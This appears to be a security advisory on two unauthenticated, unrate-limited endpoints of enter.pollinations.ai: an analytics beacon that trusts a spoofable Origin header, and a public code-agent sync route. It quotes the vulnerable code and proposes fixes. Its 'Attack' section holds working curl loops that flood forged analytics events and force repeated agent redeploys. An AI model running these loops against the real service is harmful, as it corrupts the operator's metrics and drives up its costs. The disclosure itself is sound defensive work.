# Unauthenticated write/trigger surfaces without rate limits: the analytics beacons accept arbitrarily many forged events (Tinybird ingest cost + product-metric pollution), and the public code-agent sync endpoint lets anyone force a Worker redeploy every 30 seconds per agent

## Summary

Two unauthenticated endpoints accept unlimited client-driven writes/commands:

**1. Analytics beacons gate only on a forgeable `Origin` header** (`enter.pollinations.ai/src/routes/product-analytics.ts:32`):

```ts
async function recordPageView(...) {
    if (c.req.header("Origin") !== origin) return c.body(null, 403);  // curl sends any Origin
    const view = schema.safeParse(c.req.query());
    ...
    c.executionCtx.waitUntil(captureProductEvent(c.env, event, session?.user.id ?? "", {...}));
```

There is no rate limit, no session requirement, and no other validation. The `Origin` header is trivially set by non-browser clients, so anyone can POST unlimited `page_viewed` / `website_page_viewed` events (plus forged `utm_*`, `referrer_host`, `country` from headers? no — country comes from `cf-ipcountry`, but the query fields are attacker-chosen) to the Tinybird `product_event` datasource via `captureProductEvent` (`utils/product-analytics.ts:37-90`). Per-event size is bounded by the zod schema, but event count is unbounded. The same helper also fires on auth/device lifecycle events, so the datasource is the basis of product funnels (sign-in started/returned/completed are counted server-side; page views are the denominators).

**2. Public code-agent sync** (`enter.pollinations.ai/src/routes/agents.ts:629-650`, `syncCodeAgent` at `207-267`):

```ts
export const publicAgentSyncRoutes = new Hono<Env>().post(
    "/:id/sync",
    ... async (c) => c.json(await syncCodeAgent(c, c.req.param("id"))),
);
```

`syncCodeAgent` is throttled only per agent id (once every 30 seconds, `agents.ts:221-233`) — a *global* throttle, not per-caller. Each accepted call runs `resolveCodeAgentRepository` (GitHub API), `loadCodeAgentSource` (fetch of `agent.ts`), and `deployCodeAgent` (a Cloudflare Workers deploy). Anyone unauthenticated can keep every deployed code agent in a permanent 30-second redeploy loop, driving sustained GitHub-API and Cloudflare-deploy churn that the agent owners cannot turn off (the endpoint is by design unauthenticated — used by repo webhooks — but any third party can also trigger it).

## Attack

```bash
# 1. Analytics pollution (unbounded, unauthenticated):
while true; do
  curl -s "https://enter.pollinations.ai/api/analytics/page-view?path=/&page=%2F&utm_source=evil" \
       -X POST -H "Origin: https://enter.pollinations.ai" -o /dev/null
done
# → every iteration is a Tinybird ingest row billed against the ingest quota,
#   and every dashboard funnel that divides by page views is corrupted.

# 2. Agent redeploy churn (every 30s per agent, unauthenticated):
AGENT_ID="<any code agent id from the public models catalog>"
while true; do
  sleep 30
  curl -sS -X POST "https://enter.pollinations.ai/api/account/agents/$AGENT_ID/sync"
done
```

Agent ids are public: they are the `upstream_model` of every `code_agent` listing in the public community catalog (`gen` model registry exposes `community/<owner>/<name>`, and the catalog's community listing carries the id).

## Impact

- **Analytics integrity + ingest cost**: unbounded unauthenticated writes to a paid managed ingest (Tinybird). Funnel metrics (sign-in conversion, page views, top-up funnels) can be arbitrarily distorted by one script; ingest volume/cost is attacker-controlled.
- **Resource churn**: unauthenticated forced redeploys of every code agent (GitHub API + Cloudflare deploy API), bounded only by the 30s global throttle per agent; deploy-failure noise and potential deploy-quota exhaustion on the platform account.
- Neither leaks data or money directly — hence low severity — but both are attacker-only, require no account, and have no rate limit (contrast: `/api/quests/check` *does* throttle per user).

## Fix (minimal)

1. Rate-limit both beacon routes per IP (Cloudflare's built-in `CF-Connecting-IP` is already trusted elsewhere in the codebase, `advanced.ipAddress.ipAddressHeaders`), e.g. `c.env.RATE_LIMITER.limit({ key: ip })`, and/or require a same-site session or a signed beacon token.
2. For the agent sync, bind the public trigger to the repository's webhook secret (a GitHub `X-Hub-Signature-256` check, or a per-agent secret), or make the per-agent throttle per-IP as well.
3. Consider validating that the `Origin`/`Referer`-derived `page` values are from the expected enum before ingest (already partly enforced by the zod schema).
